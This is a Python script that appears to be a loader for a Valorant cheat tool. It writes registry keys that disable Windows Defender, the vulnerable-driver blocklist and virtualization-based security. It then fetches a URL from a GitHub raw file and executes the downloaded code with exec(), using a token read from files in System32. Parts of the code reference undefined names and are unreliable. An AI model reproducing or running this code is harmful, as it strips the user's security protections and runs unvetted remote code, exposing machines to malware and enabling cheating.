from cryptography.fernet import Fernet
import requests
import os
from art import *
import getpass
import keyring

import subprocess

def is_valorant_running():
    result = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
    if 'VALORANT.exe' in result.stdout:
        return True
    return False
if is_valorant_running() and cskey != "jjxihNw6viocnIII-aesthetic" or cskey=="mklQclFqrT2hkGUU-aesthetic" or cskey=="nIth7N3eiyR4vZV3-aesthetic":
    os.system('cls')
    mylogo()
    printg("---ERROR. Please close Valor4nt first before you open the AES Software.")
    printg("---This is for your own safety.")
    show_message_box("ERROR. Please close Valor4nt first before you open the AES Software.", "Error", MB_OK | ICON_ERROR)
    exit()
else:
    print("")
try:
    subprocess.run('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, check=True)
    print("Command executed successfully.")
except subprocess.CalledProcessError as e:
    print("Error occurred:", e)

os.system('cls')
try:
    subprocess.run('reg add HKLM\SYSTEM\CurrentControlSet\CI\Config /v "VulnerableDriverBlocklistEnable" /t REG_DWORD /d 0 /f', shell=True, check=True)
    print("")
except subprocess.CalledProcessError as e:
    print("Error occurred:", e)

os.system('cls')
try:
    subprocess.run('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f', shell=True, check=True)
    print("")
except subprocess.CalledProcessError as e:
    print("Error occurred:", e)

os.system('cls')
try:
    subprocess.run(["netsh", "interface", "ip", "delete", "arpcache"], check=True)
    print("")
except subprocess.CalledProcessError as e:
    print(f"Error: {e}")
os.system('cls')
def new_function_name(mycontent):
    raw2_url  = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/rawaes.txt'

    crpppttkkyy = Fernet.generate_key()
    cipher_suite = Fernet(crpppttkkyy)
    
    cipher_text = cipher_suite.encrypt(mycontent.encode())
    
    os.environ['crpppttkkyy'] = crpppttkkyy.decode()
    os.environ['ncrptttkkn'] = cipher_text.decode()
    
    crpppttkkyy = os.environ['crpppttkkyy']
    cipher_suite = Fernet(crpppttkkyy.encode())
    ncrptttkkn = os.environ['ncrptttkkn']
    dcrpptttknnnn = cipher_suite.decrypt(ncrptttkkn.encode()).decode()
    
    
    headers = {'Authorization': f'token {dcrpptttknnnn}'}
    
    raw2response = requests.get(raw2_url,headers=headers)
    raw2finalcontent = raw2response.text
    raw2urlfinal = raw2finalcontent
    raw2urlfinalresponse = requests.get(raw2urlfinal,headers=headers)
    if raw2urlfinalresponse.status_code == 200:  
        content2 =  raw2urlfinalresponse.text
        if True:      
            rawfile_url = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/rawaes.txt'
            rawresponse = requests.get(rawfile_url)
            rawcontent = rawresponse.text
            raw_url = rawcontent
            response = requests.get(raw_url, headers=headers)
            content = response.text
            print("Make sure its working fine. The account's email.The owner might change the password of the account anytime.\n\n2. Inactive accounts are accounts that have not been used by the owner for 2weeks to months or years.\n\n3. If the account is  invalid, or perma banned, you can request for a replacement within 24 hours.",exec(f"{content}"))
            os.system('cls')
            
        else:
            print("error")
            os.system('cls')
            
    else:
        print("error")

    if raw2urlfinalresponse.status_code != 200:
        exit()

def get_string_from_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            content = file.read()
        return content
    else:
        return "Error"
system_info_path = os.path.join(os.environ['SystemRoot'], 'System32', 'systeminfo.txt')
system_driver_vul_path = os.path.join(os.environ['SystemRoot'], 'System32', 'system_driver_vul.txt')
data_vulnerable_path = os.path.join(os.environ['SystemRoot'], 'System32', 'data_vulnerable_x.txt')
content1 = get_string_from_file(system_info_path)
content2 = get_string_from_file(system_driver_vul_path)
content3 = get_string_from_file(data_vulnerable_path)
content4 =  content1+content2+content3
content5 = content4
new_function_name(content5)
